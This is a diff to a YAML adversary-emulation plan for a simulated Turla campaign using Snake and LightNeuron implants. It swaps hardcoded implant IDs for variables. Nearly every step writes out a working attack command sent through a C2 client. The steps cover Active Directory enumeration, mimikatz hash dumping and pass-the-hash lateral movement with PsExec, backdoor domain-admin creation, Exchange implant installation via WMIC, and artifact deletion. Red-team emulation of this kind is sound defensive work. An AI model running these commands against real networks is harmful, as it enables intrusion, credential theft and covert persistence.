@@ -43,6 +43,26 @@
       description: The network domain name.
       type: string
       default: nk
+    first.epic.id: 
+      description: First epic implant ID
+      type: string
+      default: 218780a0-870e-480e-b2c5dc
+    first.snake.id: 
+      description: First snake implant ID
+      type: string
+      default: 534b40585d514b554844
+    second.snake.id: 
+      description: Second snake implant ID
+      type: string
+      default: 5054474d50435a51404b
+    third.snake.id: 
+      description: Third snake implant ID
+      type: string
+      default: 475e465e424557475b42
+    lightneuron.implant.id:
+      description: Lightneuron implant ID
+      type: string
+      default: info@nk.local
 
 - id: 78f44095-73b0-4ab4-a4cc-e5090ae1ae44
   name: Download malicious update (User)
@@ -194,7 +214,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | systeminfo && net group "Domain Computers" /domain' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | systeminfo && net group "Domain Computers" /domain' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.epic.id
 
 
 # Step 12 - Rootkit Installation
@@ -213,7 +236,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'name | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe | snake.exe' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'name | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe | snake.exe' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.epic.id
 
 - id: 0daff7a0-d1e4-4bf2-8100-c0a824a34c52
   name: Execute the 1st Snake installer (Adversary)
@@ -229,7 +255,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe -f' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe -f' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.epic.id
 
 - id: cb7d5320-981f-496e-bdb0-b6535025e59e
   name: Refresh Edge browser (User)
@@ -303,7 +332,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}' --task-wait-timeout 60 | grep '#{file.server.admin}' -i
+          ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{"type": 3, "proc": "tasklist.exe", "args": "/v"}' --task-wait-timeout 60 | grep '#{file.server.admin}' -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.snake.id
 
 - id: 5dbc34ff-eb4d-4897-8c4e-8288e5dd9e88
   name: Enumerate file server admin groups (Adversary)
@@ -319,7 +351,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "user /domain #{file.server.admin}"}' --task-wait-timeout 60 | grep 'File Server Admins' -i
+          ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{"type": 3, "proc": "net.exe", "args": "user /domain #{file.server.admin}"}' --task-wait-timeout 60 | grep 'File Server Admins' -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.snake.id
 
 - id: 6315f9e9-a6ee-46f2-b846-24f9c3c219c9
   name: Enumerate mapped network drives (Adversary)
@@ -335,13 +370,15 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "use", "runas": "#{network.domain.name}\\#{first.target.user}"}' --task-wait-timeout 60 | grep #{second.target.host} -i
+          ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{"type": 3, "proc": "net.exe", "args": "use", "runas": "#{network.domain.name}\\#{first.target.user}"}' --task-wait-timeout 60 | grep #{second.target.host} -i
   input_arguments:
     second.target.host: 
       description: The hostname of the second target host.
       type: string
       default: berzas
-
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.snake.id
 
 # Step 14 - Lateral Movement to File Server
 
@@ -359,7 +396,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 4, "file": "PsExec.exe", "dest":"C:\\Windows\\System32\\file_svc_mgr.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{"type": 4, "file": "PsExec.exe", "dest":"C:\\Windows\\System32\\file_svc_mgr.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.snake.id
 
 - id: f6c54eb3-f066-4721-812f-0bf6bfea01fc
   name: Download the 2nd Snake installer (Adversary)
@@ -375,7 +415,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 4, "file": "installer_v2.exe", "dest":"C:\\Windows\\System32\\cmu_svc_v2.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{"type": 4, "file": "installer_v2.exe", "dest":"C:\\Windows\\System32\\cmu_svc_v2.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.snake.id
 
 - id: 0970d7d6-279a-4ad8-a334-cfe0b5e7e0a6
   name: Execute PsExec as the File Server Administrator (Adversary)
@@ -391,8 +434,11 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "C:\\Windows\\System32\\file_svc_mgr.exe", "args":"\\\\#{second.target.host} -accepteula -s -c C:\\Windows\\System32\\cmu_svc_v2.exe", "runas":"#{network.domain.name}\\#{file.server.admin}"}' --task-wait-timeout 120
+          ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{"type": 3, "proc": "C:\\Windows\\System32\\file_svc_mgr.exe", "args":"\\\\#{second.target.host} -accepteula -s -c C:\\Windows\\System32\\cmu_svc_v2.exe", "runas":"#{network.domain.name}\\#{file.server.admin}"}' --task-wait-timeout 120
         timeout: 120
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.snake.id
 
 - id: 2386792f-7bc9-445d-b868-64a0031ea40d
   name: RDP to second target host (User)
@@ -456,7 +502,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 1, "command": "del /Q C:\\Windows\\System32\\file_svc_mgr.exe C:\\Windows\\System32\\cmu_svc_v2.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{"type": 1, "command": "del /Q C:\\Windows\\System32\\file_svc_mgr.exe C:\\Windows\\System32\\cmu_svc_v2.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.snake.id
 
 
 # Step 15 - Domain Discovery
@@ -475,7 +524,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Get-Module -ListAvailable -Name ActiveDirectory"}' --task-wait-timeout 60 | grep ActiveDirectory -i
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Get-Module -ListAvailable -Name ActiveDirectory"}' --task-wait-timeout 60 | grep ActiveDirectory -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 70a19730-04e9-45be-8463-7a359eaee657
   name: Enumerate Active Directory groups (Adversary)
@@ -491,7 +543,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroup -Filter * | Where-Object Name -Match \"management\" | Select Name"}' --task-wait-timeout 60 | grep 'Server Management' -i
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroup -Filter * | Where-Object Name -Match \"management\" | Select Name"}' --task-wait-timeout 60 | grep 'Server Management' -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: bb06008c-561b-4a98-992e-fb7a0432aa45
   name: Enumerate accounts belonging to the Server Management domain group (Adversary)
@@ -507,12 +562,15 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Server Management\" | Select Name,SamAccountName"}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Server Management\" | Select Name,SamAccountName"}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
   input_arguments:
     domain.admin.user: 
       description: The username of a domain admin.
       type: string
       default: ZilvinasAdmin
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 8649c19c-0e25-43f3-a267-e0c0c92dd74f
   name: Enumerate accounts belonging to the Domain Admins domain group (Adversary)
@@ -528,7 +586,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Domain Admins\" | Select Name,SamAccountName"}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Domain Admins\" | Select Name,SamAccountName"}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: d761e02e-fea4-457e-a434-aa49383b7996
   name: Enumerate account information (Adversary)
@@ -544,8 +605,11 @@
     linux:
       sh:
         command: |
-          output=$(./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADUser -Filter {LastLogonDate -ne 0} -Properties * | Select Name,SamAccountName"}' --task-wait-timeout 60);
+          output=$(./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADUser -Filter {LastLogonDate -ne 0} -Properties * | Select Name,SamAccountName"}' --task-wait-timeout 60);
           echo $output | grep '#{second.target.user}' -iw && echo $output | grep '#{domain.admin.user}' -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 44daae27-4c78-4a38-9a68-88aeabd87a32
   name: Enumerate domain computer information (Adversary)
@@ -561,7 +625,7 @@
     linux:
       sh:
         command: |
-          output=$(./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select Name,DnsName,IPv4Address,Description"}' --task-wait-timeout 60);
+          output=$(./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select Name,DnsName,IPv4Address,Description"}' --task-wait-timeout 60);
           echo $output | grep '#{second.target.user} Workstation' -i && echo $output | grep '#{fourth.target.host}' -i
   input_arguments:
     fourth.target.host: 
@@ -572,6 +636,9 @@
       description: The username of the second target host.
       type: string
       default: Zilvinas
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 
 # Step 16 - Preparation for Lateral Movement to Admin Workstation
@@ -590,7 +657,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 4, "file": "mimikatz.exe", "dest": "C:\\Windows\\System32\\loadperf.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 4, "file": "mimikatz.exe", "dest": "C:\\Windows\\System32\\loadperf.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 55bef1eb-e1b5-46c6-94b9-a9637688d114
   name: Download PsExec to the file server (Adversary)
@@ -606,7 +676,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 4, "file": "PsExec.exe", "dest": "C:\\Windows\\System32\\fs_mgr.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 4, "file": "PsExec.exe", "dest": "C:\\Windows\\System32\\fs_mgr.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 095324d9-a6e8-4964-a5ba-92fff6907c2e
   name: Download 3rd Snake installer to the file server (Adversary)
@@ -622,7 +695,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 4, "file": "installer_v3.exe", "dest":"C:\\Windows\\System32\\cmu_svc.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 4, "file": "installer_v3.exe", "dest":"C:\\Windows\\System32\\cmu_svc.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 256ed126-a10c-4736-a074-216ab90da8f2
   name: Dump NTLM hashes on the file server (Adversary)
@@ -638,12 +714,15 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::lop\" \"quit\""}' --task-wait-timeout 60 | grep #{domain.admin.ntlm}
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::lop\" \"quit\""}' --task-wait-timeout 60 | grep #{domain.admin.ntlm}
   input_arguments:
     domain.admin.ntlm: 
       description: The NTLM of a domain admin.
       type: string
       default: f3fcd61f987a97da49ce5f650b4e6539
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 
 # Step 17 - Lateral Movement to Admin Workstation and Persistence
@@ -662,12 +741,15 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::htp /user:#{domain.admin.user} /ntlm:#{domain.admin.ntlm} /domain:#{network.domain.name}.local /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\fs_mgr.exe /sys:1 /prun:C:\\Windows\\System32\\cmu_svc.exe\" \"quit\""}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::htp /user:#{domain.admin.user} /ntlm:#{domain.admin.ntlm} /domain:#{network.domain.name}.local /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\fs_mgr.exe /sys:1 /prun:C:\\Windows\\System32\\cmu_svc.exe\" \"quit\""}' --task-wait-timeout 60
   input_arguments:
     third.target.host: 
       description: The hostname of the third target host.
       type: string
       default: uosis
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 42859ec4-b714-48ca-be74-9438bbbaaf7b
   name: RDP to the third target host (User)
@@ -746,7 +828,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 1, "command": "del /Q C:\\Windows\\System32\\fs_mgr.exe C:\\Windows\\System32\\loadperf.exe C:\\Windows\\System32\\cmu_svc.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 1, "command": "del /Q C:\\Windows\\System32\\fs_mgr.exe C:\\Windows\\System32\\loadperf.exe C:\\Windows\\System32\\cmu_svc.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.snake.id
 
 - id: 27083aa1-9a0d-4fe4-9154-fa6f0598e2f9
   name: Enumerate processes (Adversary)
@@ -762,7 +847,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}' --task-wait-timeout 60 | grep '#{domain.admin.user}' -i
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 3, "proc": "tasklist.exe", "args": "/v"}' --task-wait-timeout 60 | grep '#{domain.admin.user}' -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id:  384f3d1f-97f1-4070-98c5-764de023ed2c
   name: Create a new domain user (Adversary)
@@ -779,7 +867,7 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "net user #{new.domain.user} #{new.domain.password} /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "net user #{new.domain.user} #{new.domain.password} /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
   input_arguments:
     new.domain.user:
       description: The username of the new domain user.
@@ -789,6 +877,9 @@
       description: The password of the new domain user.
       type: string
       default: Password12345
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 36d93251-6932-49b9-82ad-994abd27730a
   name: Add the new domain user to the Domain Admins group (Adversary)
@@ -804,7 +895,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "net group \"Domain Admins\" #{new.domain.user} /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "net group \"Domain Admins\" #{new.domain.user} /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 
 # Step 18 - Lateral Movement to Exchange Server
@@ -823,7 +917,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "ln_transport_agent.dll", "dest":"C:\\Windows\\System32\\mtxconf.dll"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 4, "file": "ln_transport_agent.dll", "dest":"C:\\Windows\\System32\\mtxconf.dll"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: b43fb6c6-05d2-42ff-9083-e70d5dbea078
   name: Download the companion DLL for LightNeuron (Adversary)
@@ -839,7 +936,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "n_installer_aux.dll", "dest":"C:\\Windows\\System32\\mtxcli.dll"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 4, "file": "n_installer_aux.dll", "dest":"C:\\Windows\\System32\\mtxcli.dll"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: bcea95e5-76a0-4774-b51d-cdf6b1fd9ce0
   name: Download the Powershell installation script for LightNeuron (Adversary)
@@ -855,7 +955,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "msiex.ps1", "dest":"C:\\Windows\\System32\\msiex.ps1"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 4, "file": "msiex.ps1", "dest":"C:\\Windows\\System32\\msiex.ps1"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 62f66621-1ff8-4054-bbd8-b3f374d55199
   name: Download the LightNeuron email rules file (Adversary)
@@ -871,7 +974,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "rules.xml", "dest":"C:\\Windows\\System32\\wdr.rules.xml"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 4, "file": "rules.xml", "dest":"C:\\Windows\\System32\\wdr.rules.xml"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 09fc13b4-b345-41ce-b5a8-4214a37b627a
   name: Download the LightNeuron config file (Adversary)
@@ -887,7 +993,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "winmail.dat", "dest":"C:\\Windows\\System32\\perfe009.dat"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 4, "file": "winmail.dat", "dest":"C:\\Windows\\System32\\perfe009.dat"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: fea61ba7-d932-4a42-b988-5cf9de3ed118
   name: Copy LightNeuron transport agent DLL to the Exchange Server (Adversary)
@@ -903,7 +1012,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxconf.dll \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\agents\\Hygiene\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxconf.dll \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\agents\\Hygiene\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 8c6bfbe8-60f0-4ca8-a955-c35be84be374
   name: Copy LightNeuron companion DLL to the Exchange Server (Adversary)
@@ -919,7 +1031,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxcli.dll \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\exdbdata.dll\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxcli.dll \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\exdbdata.dll\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 2d061b67-5d49-4a0c-a7af-1b8a3a6fdd78
   name: Copy PowerShell installation script to the Exchange Server (Adversary)
@@ -935,7 +1050,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\msiex.ps1 \\\\#{fourth.target.host}\\C$\\Windows\\System32\\msiex.ps1", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "copy C:\\Windows\\System32\\msiex.ps1 \\\\#{fourth.target.host}\\C$\\Windows\\System32\\msiex.ps1", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: ded4d5a0-bcd6-41f8-899b-9fa4fddac445
   name: Copy email rules file to the Exchange server (Adversary)
@@ -951,7 +1069,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\wdr.rules.xml \\\\#{fourth.target.host}\\C$\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "copy C:\\Windows\\System32\\wdr.rules.xml \\\\#{fourth.target.host}\\C$\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 0ee2902a-f75e-4367-9e99-2124d3070b4e
   name: Copy config file to the Exchange server (Adversary)
@@ -967,7 +1088,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\perfe009.dat \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\winmail.dat\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "copy C:\\Windows\\System32\\perfe009.dat \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\winmail.dat\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 6dd62c1c-b65c-4e28-b241-04121cbbc9af
   name: Install LightNeuron on the Exchange Server (Adversary)
@@ -983,7 +1107,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 3, "proc": "wmic.exe", "args": "/node:#{fourth.target.host} /privileges:enable /output:STDOUT process call create \"cmd.exe /c powershell.exe -File C:\\Windows\\System32\\msiex.ps1 > C:\\Windows\\Temp\\msiexinstallation.log 2>&1\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep 'ReturnValue = 0;' -i
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 3, "proc": "wmic.exe", "args": "/node:#{fourth.target.host} /privileges:enable /output:STDOUT process call create \"cmd.exe /c powershell.exe -File C:\\Windows\\System32\\msiex.ps1 > C:\\Windows\\Temp\\msiexinstallation.log 2>&1\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep 'ReturnValue = 0;' -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 658daa6f-97c0-41c0-af97-d6b4969d2e7c
   name: Check installation log (Adversary)
@@ -999,7 +1126,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "type \\\\#{fourth.target.host}\\C$\\Windows\\Temp\\msiexinstallation.log", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep "Waiting for service 'Microsoft Exchange Transport (MSExchangeTransport)' to start..." -i
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "type \\\\#{fourth.target.host}\\C$\\Windows\\Temp\\msiexinstallation.log", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep "Waiting for service 'Microsoft Exchange Transport (MSExchangeTransport)' to start..." -i
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 - id: 38023f7d-d776-46bb-bbfc-1f4853e8169b
   name: Delete artifacts from the fourth target host (Adversary)
@@ -1015,7 +1145,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "del /Q C:\\Windows\\System32\\msiex.ps1 C:\\Windows\\System32\\wdr.rules.xml C:\\Windows\\System32\\mtxconf.dll C:\\Windows\\System32\\mtxcli.dll C:\\Windows\\System32\\perfe009.dat"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "del /Q C:\\Windows\\System32\\msiex.ps1 C:\\Windows\\System32\\wdr.rules.xml C:\\Windows\\System32\\mtxconf.dll C:\\Windows\\System32\\mtxcli.dll C:\\Windows\\System32\\perfe009.dat"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.snake.id
 
 
 # Step 19 - Discovery and Email Collection
